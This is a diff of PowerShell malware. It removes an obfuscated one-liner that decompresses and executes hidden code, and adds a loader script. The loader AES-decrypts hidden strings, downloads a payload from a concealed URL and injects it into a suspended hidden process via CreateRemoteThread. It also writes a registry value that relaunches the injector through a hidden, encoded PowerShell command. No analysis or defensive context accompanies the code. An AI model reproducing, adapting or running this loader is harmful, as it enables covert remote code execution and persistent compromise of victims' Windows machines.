@@ -1,1 +1,259 @@
- (nEW-objECt  SYsTeM.io.COmpReSSIOn.dEFlatesTream([SySTEM.IO.mEmOrYstReAM][ConVErT]::FroMbase64StrInG( '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') ,[IO.CoMpreSSION.CoMpREsSiONmodE]::dEcOmpREsS)| %{ nEW-objECt iO.sTReamreAder( $_ , [TexT.ENcODiNG]::asCiI )}).READToenD()|. ( $SHELLId[1]+$shellid[13]+'x')
+[System.Threading.Thread]::CurrentThread.CurrentCulture = [System.Globalization.CultureInfo]::InvariantCulture
+[System.Threading.Thread]::CurrentThread.CurrentUICulture = [System.Globalization.CultureInfo]::InvariantCulture
+$ErrorActionPreference = ("{3}{2}{0}{1}"-f't','lyContinue','len','Si')
+
+function fnCalc {
+    $seg = 100
+    $inc = 4.0 / $seg
+    $acc = 0.0
+    for ($i = 0; $i -lt $seg; $i++) {
+        $x = $i * $inc
+        $acc += ($x * $x) * $inc
+    }
+    $dPart = 12.0
+    $sum = $acc + $dPart
+    return [math]::Round($sum, 5).ToString().Replace('.', '')
+}
+
+$lineA = ("{2}{6}{5}{3}{1}{4}{0}" -f 'j_xof','_spm','god_y','vo','u','_re','zal_eht')
+$lineB = ("{2}{0}{1}"-f'ci','uq_','_nworb_k')
+$lineC = "eht"
+$all = $lineA + $lineB + $lineC
+
+function fnKey($calcVal, $ss) {
+    $combo = $calcVal + $ss
+    if ($combo.Length -lt 16) { $combo += "0" * (16 - $combo.Length) }
+    return [Text.Encoding]::UTF8.GetBytes($combo.Substring(0, 16))
+}
+
+$z = fnCalc
+$k = fnKey $z $all
+$v = New-Object Byte[](16)
+
+function fnDec {
+    param(
+        [string]$c,
+        [byte[]]$kk,
+        [byte[]]$iv
+    )
+    [byte[]]$raw = [Convert]::FromBase64String($c)
+    $aes = New-Object System.Security.Cryptography.AesManaged
+    $aes.Key = $kk
+    $aes.IV = $iv
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $dec = $aes.CreateDecryptor()
+    [byte[]]$out = $dec.TransformFinalBlock($raw, 0, $raw.Length)
+    $aes.Dispose()
+    return [Text.Encoding]::UTF8.GetString($out)
+}
+
+$a1 = ("{14}{20}{25}{26}{1}{8}{21}{17}{22}{23}{24}{19}{11}{9}{15}{0}{4}{16}{10}{18}{6}{7}{3}{12}{5}{2}{13}"-f'ph/','vCxjFw','FB','bg1ZKMA','oN','xJT','r9t','4l','9','IoFY','z','Ouzp','LwTS','O8nz2bk=','abS53','7FfkKMAYtjVKA','gHraeQ','6hJ4s','8R+olyl/Pj6f','U','U','mYKXvGM','e','E','O','u','mAg9')
+$a2 = ("{14}{5}{4}{6}{10}{12}{16}{13}{2}{1}{18}{15}{17}{7}{8}{11}{3}{9}{0}" -f '6lKqpJdFHR4Lw/Mw==','FEE','JxH','1hSqjM','l','l2','k','N','Og','x','3lqm2hBfXcBCcw7LN','uXgTl2','V','5','/','JrO9','k6E','jkJKl','ZJFHPw2DbXwi')
+$a3 = ("{3}{2}{11}{9}{5}{6}{1}{7}{0}{10}{4}{8}"-f 'ScI+Tf','V0kPj','zu','b','fn85U','g','f2','uOqDSHhx','Stx7U=','8u','UWoCR','v')
+$a4 = ("{3}{10}{5}{4}{0}{7}{2}{1}{6}{8}{9}"-f 'dL7r','AV','P','I','gCU9z9piuRgq','hx','bCA9jh','s2','g7k3','ohxizo=','dXv')
+
+try {
+    $u  = fnDec -c $a1 -kk $k -iv $v  
+    $rp = fnDec -c $a2 -kk $k -iv $v 
+    $px = fnDec -c $a3 -kk $k -iv $v  
+    $rv = fnDec -c $a4 -kk $k -iv $v  
+} catch {
+    return
+}
+
+# --- Conditional load for the xR C# type ---
+if (-not ("xR" -as [Type])) {
+    Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+public class xR {
+    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
+    public static extern bool CreateProcess(
+        string lpApplicationName, 
+        string lpCommandLine,
+        IntPtr lpProcessAttributes, 
+        IntPtr lpThreadAttributes, 
+        bool bInheritHandles,
+        uint dwCreationFlags, 
+        IntPtr lpEnvironment, 
+        string lpCurrentDirectory,
+        ref SI lpStartupInfo, 
+        out PI lpProcessInformation
+    );
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr VirtualAllocEx(
+        IntPtr hProcess, 
+        IntPtr lpAddress,
+        uint dwSize, 
+        uint flAllocationType, 
+        uint flProtect
+    );
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool WriteProcessMemory(
+        IntPtr hProcess, 
+        IntPtr lpBaseAddress, 
+        byte[] lpBuffer, 
+        int nSize, 
+        out IntPtr lpNumberOfBytesWritten
+    );
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr CreateRemoteThread(
+        IntPtr hProcess, 
+        IntPtr lpThreadAttributes, 
+        uint dwStackSize, 
+        IntPtr lpStartAddress, 
+        IntPtr lpParameter, 
+        uint dwCreationFlags, 
+        out IntPtr lpThreadId
+    );
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern uint ResumeThread(IntPtr hThread);
+    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
+    public struct SI {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public uint dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PI {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public uint dwProcessId;
+        public uint dwThreadId;
+    }
+    public static bool zQ(byte[] pl, string tx) {
+        // If token parsing issues occur, try using an inline comment in the type cast:
+        // For example: [Type]( /*fix*/ 'xR')
+        SI si = new SI();
+        si.cb = (uint)Marshal.SizeOf(si);
+        si.dwFlags = 0x00000001;
+        si.wShowWindow = 0;
+        PI pi = new PI();
+        uint cf = 0x08000000 | 0x4; 
+        bool ok = CreateProcess(tx, null, IntPtr.Zero, IntPtr.Zero, false, cf, IntPtr.Zero, null, ref si, out pi);
+        if(!ok) return false;
+        IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)pl.Length, 0x3000, 0x40);
+        if(addr == IntPtr.Zero) return false;
+        IntPtr tmp;
+        bool wr = WriteProcessMemory(pi.hProcess, addr, pl, pl.Length, out tmp);
+        if(!wr || (int)tmp != pl.Length) return false;
+        IntPtr thrId;
+        IntPtr thr = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out thrId);
+        if(thr == IntPtr.Zero) return false;
+        ResumeThread(pi.hThread);
+        return true;
+    }
+}
+"@
+}
+
+try {
+    $wc = New-Object System.Net.WebClient
+    [byte[]]$payload = $wc.DownloadData($u)
+    if ($payload -and $payload.Length -gt 0) {
+        [xR]::zQ($payload, $px) | Out-Null
+    }
+} catch {
+    return
+}
+
+$st = @'
+param([string]$u, [string]$p)
+try {
+  $wc = New-Object System.Net.WebClient
+  [byte[]]$b = $wc.DownloadData($u)
+  # Conditional load for xR in this new session
+  if (-not ("xR" -as [Type])) {
+      Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+public class xR {
+    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
+    public static extern bool CreateProcess(string a, string c, IntPtr pa, IntPtr ta, bool i, uint f, IntPtr e, string d, ref SI si, out PI pi);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr hp, IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool WriteProcessMemory(IntPtr hp, IntPtr ba, byte[] buf, int n, out IntPtr wr);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr CreateRemoteThread(IntPtr hp, IntPtr attr, uint st, IntPtr sa, IntPtr pr, uint fl, out IntPtr t2);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern uint ResumeThread(IntPtr hT);
+    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
+    public struct SI {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public uint dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PI {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public uint dwProcessId;
+        public uint dwThreadId;
+    }
+    public static bool zQ(byte[] pl, string tx) {
+        SI si = new SI();
+        si.cb = (uint)System.Runtime.InteropServices.Marshal.SizeOf(si);
+        si.dwFlags = 0x00000001;
+        si.wShowWindow = 0;
+        PI pi = new PI();
+        uint cf = 0x08000000 | 0x4;
+        bool ok = CreateProcess(tx, null, IntPtr.Zero, IntPtr.Zero, false, cf, IntPtr.Zero, null, ref si, out pi);
+        if(!ok) return false;
+        IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)pl.Length, 0x3000, 0x40);
+        if(addr == IntPtr.Zero) return false;
+        IntPtr wr;
+        bool w2 = WriteProcessMemory(pi.hProcess, addr, pl, pl.Length, out wr);
+        if(!w2 || (int)wr != pl.Length) return false;
+        IntPtr tid;
+        IntPtr thr = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out tid);
+        if(thr == IntPtr.Zero) return false;
+        ResumeThread(pi.hThread);
+        return true;
+    }
+}
+"@
+  }
+  [xR]::zQ($b, $p) | Out-Null
+} catch {}
+'@
+
+$stB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($st))
+$rcmd = ('p'+'owe'+'rshell.ex'+'e '+'-No'+'Profile'+' '+'-'+'Wi'+'ndowStyle '+'Hi'+'dden '+'-Exe'+'cution'+'Po'+'lic'+'y '+'By'+'pass '+'-En'+'codedCom'+'ma'+'nd '+"$stB64 "+'-u'+' '+"`"$u`" "+'-'+'p '+"`"$px`"")
+
+try {
+    New-ItemProperty -Path $rp -Name $rv -Value $rcmd -PropertyType String -Force | Out-Null
+} catch {}
